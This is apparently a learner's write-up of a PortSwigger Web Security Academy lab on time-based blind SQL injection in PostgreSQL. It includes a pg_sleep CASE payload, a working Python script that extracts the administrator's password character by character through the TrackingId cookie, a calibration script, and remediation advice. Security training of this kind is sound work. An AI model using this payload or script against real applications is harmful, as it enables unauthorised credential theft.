# Blind SQL Injection with Time Delays and Information Retrieval
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-27

## The Problem
Building directly on lab 13 (confirming time-based injection with an unconditional `pg_sleep`), this lab extends the technique to full character-by-character data extraction — the same goal as labs 11 and 12, but using response time as the only signal, since the application gives no visible content difference and no distinguishable error page.

## Discovery / Exploitation
The core payload wraps the same `pg_sleep()` delay behind a real condition tied to the administrator's password:

```sql
'||(SELECT CASE WHEN (username='administrator' AND substring(password,1,1)='a')
    THEN pg_sleep(10) ELSE pg_sleep(0) END
    FROM users WHERE username='administrator')--
```

This asks: *"Is the first character of the administrator's password 'a'?"* If true, the response takes ~10 seconds longer; if false, it returns immediately.

**A subtle but critical bug surfaced during testing:** the subquery must return exactly one row. Without a `WHERE username='administrator'` clause filtering the outer `FROM users`, the `CASE` expression evaluates once per row in the table. With more than one user in the table, PostgreSQL raises `more than one row returned by a subquery used as an expression` — the query fails fast (no delay), and the extraction loop reads that failure as "false" for every character, occasionally producing garbage results if network jitter happens to cross the timing threshold by chance. Filtering with `WHERE username='administrator'` guarantees a single-row result and removes this failure mode entirely.

**Calibration matters:** before trusting a full 20-character extraction run (which can send close to 2,000 requests), it's worth confirming the timing behavior with two known conditions — one guaranteed true (`1=1`) and one guaranteed false (`1=2`) — and checking that the measured response times are clearly separated (e.g. ~10s vs under 1s) before relying on that gap to drive automated extraction.

## Impact
Time-based extraction proves that full credential disclosure is possible even when an application provides zero visible feedback of any kind — not even a distinguishable error page (unlike lab 12). The only cost is speed: every character requires testing up to 94 possible ASCII values, and a correct guess costs a full 10-second delay, making this by far the slowest extraction method covered in this series but also the most broadly applicable, since it doesn't depend on any particular error condition being triggerable.

## Proof of Concept (Python)
This script performs the full character-by-character extraction using the single-row-guaranteed query structure.

```python
import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sql_payload = "'||(SELECT CASE WHEN (ASCII(SUBSTRING(password,%s,1))=%s) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {
                'TrackingId': 'zbq7A6IrTEJAakWt' + sqli_payload_encoded,
                'session': 'XrxOTwUdGiVSEu2rMKXBYNxWFqF6SRWm'
            }
            r = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
    print()
    return password_extracted


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. For each password position (1–20) and each printable ASCII value (32–126), injects a payload into the `TrackingId` cookie that only delays the response by 10 seconds when the character at that position matches
2. Uses `response.elapsed.total_seconds()` (the same timing mechanism from lab 13) to detect the delay
3. Filters to a single row (`WHERE username='administrator'`) inside the subquery, avoiding the multi-row evaluation bug described above
4. Appends the matching character and moves to the next position once a match is found

**Calibration script** (recommended before a full run):
```python
import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def test_condition(url, condition_sql, label):
    sql_payload = "'||(SELECT CASE WHEN (%s) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--" % condition_sql
    sqli_payload_encoded = urllib.parse.quote(sql_payload)
    cookies = {
        'TrackingId': 'zbq7A6IrTEJAakWt' + sqli_payload_encoded,
        'session': 'XrxOTwUdGiVSEu2rMKXBYNxWFqF6SRWm'
    }
    r = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
    print("%s -> elapsed: %.2f seconds" % (label, r.elapsed.total_seconds()))


if __name__ == "__main__":
    url = sys.argv[1]
    test_condition(url, "1=1", "TRUE test")
    test_condition(url, "1=2", "FALSE test")
```
A clean separation (e.g. ~10s vs under 1s) confirms the timing signal is reliable before committing to a full extraction run.

**Example run:**
```bash
python3 exploit_sqli_time_based_extract.py https://your-lab-url.web-security-academy.net
```

**Debugging notes:**
- Always filter the subquery to a single row — an unfiltered `FROM users` with more than one row in the table causes a runtime error that masks itself as consistent "false" results rather than a clean crash, since the malformed query fails fast instead of throwing a page-level error
- Fresh `TrackingId`/`session` cookie values are required, as with labs 11–12
- A full 20-character extraction can involve close to 2,000 requests and multiple minutes of cumulative delay from correct-guess pauses alone — long enough that a session timeout mid-run is a realistic failure mode worth checking for if results look inconsistent partway through

## Remediation
- Use **parameterized queries (prepared statements)** — the consistent defense across the entire SQL injection series.
- Apply **strict query timeouts** at the database or application layer to prevent any single request from holding a connection open for an attacker-controlled duration.
- Apply **rate limiting**, since this attack requires an especially large number of slow, sequential requests, making it both slow to execute and comparatively easy to detect and throttle.

## Takeaway
This lab combines the character-extraction loop from labs 11–12 with the timing oracle confirmed in lab 13, completing the full picture of blind SQL injection techniques. It also reinforces a broader lesson from this series: subquery structure matters as much as the injected condition itself — an unfiltered subquery that can return more than one row doesn't just risk an error, it can silently corrupt an entire extraction run by masking a real signal (the delay) behind an unrelated failure (the row-count error), making careful query construction and calibration testing essential before trusting fully automated results.
